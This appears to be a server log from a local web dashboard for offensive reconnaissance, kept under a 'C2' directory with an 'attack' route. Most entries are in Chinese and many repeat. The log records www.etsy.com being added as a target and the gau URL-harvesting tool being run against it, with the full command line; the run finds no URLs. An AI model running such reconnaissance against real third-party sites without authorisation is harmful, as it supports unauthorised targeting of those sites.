2025-06-05 16:56:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:04] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 16:56:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:04] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 16:56:08 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:56:08 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:56:08 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 16:56:08 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 16:56:08 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 16:56:08 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 16:56:08 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 16:56:08 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 16:56:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:08] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-05 16:56:08 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749113768.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:56:08 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749113768.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 16:56:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:22] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:56:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:24] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:27] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:30] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:33] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:36] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:39] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:40] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:56:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:42] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:45] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:48] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:51] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:54] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:56:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:56:57] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:00] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:06] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:09] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:57:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:12] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:15] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:18] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:21] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:57:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:57:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:58:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:58:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:58:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:58:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:59:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:39] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 16:59:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:39] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:45] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:48] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:51] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:54] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 16:59:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 16:59:57] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:00] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:03] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:09] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:10] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:00:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:12] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:15] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:18] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:21] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:24] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:27] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:30] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:33] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:36] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:39] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:42] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:45] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:48] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:51] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:51 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 17:00:51 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 17:00:51 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 17:00:51 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 17:00:51 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 17:00:51 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 17:00:51 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 17:00:51 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 17:00:51 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749113768.txt
2025-06-05 17:00:51 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749113768.txt
2025-06-05 17:00:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:54] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:00:54 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 17:00:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:54] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 17:00:54 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 17:00:54 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 17:00:54 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 17:00:54 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 17:00:54 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 17:00:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:00:54] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 17:01:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:01:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:02:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 17:02:22 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:22 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:22 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:22 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 17:02:22 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:22 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:22 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:22 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:22 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:22 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:22 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 17:02:22 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:22 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:22 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 17:02:22 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 17:02:24 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:24 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:24] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 17:02:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:24] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 17:02:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:24] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:24] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 17:02:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:24] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:02:32 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:32 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 17:02:32 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:32 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 17:02:32 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:32 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 17:02:32 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:32 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 17:02:32 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 17:02:32 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:32 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 17:02:32 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 17:02:32 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 17:02:36 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:36 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 17:02:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:36] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:44 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 17:02:44 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 17:02:44 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-05 17:02:44 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.006s)
2025-06-05 17:02:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:44] "GET / HTTP/1.1" 200 -
2025-06-05 17:02:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:45] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:48 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 17:02:48 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.001s)
2025-06-05 17:02:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:48] "GET /add_target HTTP/1.1" 200 -
2025-06-05 17:02:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:48] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:53 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 17:02:53 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.etsy.com', target_ip='https://www.etsy.com/'
2025-06-05 17:02:53 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 17:02:53 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-05 17:02:53 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 17:02:53 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.etsy.com/
2025-06-05 17:02:53 | INFO     | index_routes.py:84 | add_target() | 目標添加成功: ID=1
2025-06-05 17:02:53 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.005s)
2025-06-05 17:02:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:53] "[32mPOST /add_target HTTP/1.1[0m" 302 -
2025-06-05 17:02:53 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 17:02:53 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 17:02:53 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 17:02:53 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-05 17:02:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:53] "GET / HTTP/1.1" 200 -
2025-06-05 17:02:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:53] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:54 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 17:02:54 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 17:02:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:54] "GET /attack/1 HTTP/1.1" 200 -
2025-06-05 17:02:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:54] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-05 17:02:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:54] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-05 17:02:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:54] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:55 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:55 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 17:02:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:55] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 17:02:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:55] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 17:02:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:55] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 17:02:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:55] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 17:02:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:55] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 17:02:58 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 17:02:58 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 17:02:58 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 17:02:58 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.etsy.com
2025-06-05 17:02:58 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 17:02:58 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 17:02:58 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 17:02:58 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 17:02:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 17:02:58] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-05 17:02:58 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749114178.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 17:02:58 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.etsy.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749114178.txt --threads 50 --providers wayback,commoncrawl,otx,urlscan --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
